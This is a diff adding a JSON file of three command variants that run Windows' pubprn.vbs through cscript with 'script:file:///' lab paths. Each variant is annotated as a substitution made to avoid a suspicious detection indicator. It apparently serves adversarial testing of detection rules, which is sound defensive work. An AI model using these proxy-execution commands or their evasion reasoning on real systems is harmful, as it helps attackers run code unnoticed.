@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:file:///C:/Lab/input/sample.txt\"",
+    "explanation": "Substitution: Replaced the URL with a local file path using 'file://' to avoid the suspicious 'script:https://' indicator."
+  },
+  {
+    "output": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:file:///C:/Lab/input/sample.log\"",
+    "explanation": "Substitution: Replaced the URL with a local file path using 'file://' to avoid the suspicious 'script:https://' indicator."
+  },
+  {
+    "output": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:file:///C:/Lab/out/archive.7z\"",
+    "explanation": "Substitution: Replaced the URL with a local file path using 'file://' to avoid the suspicious 'script:https://' indicator."
+  }
+]
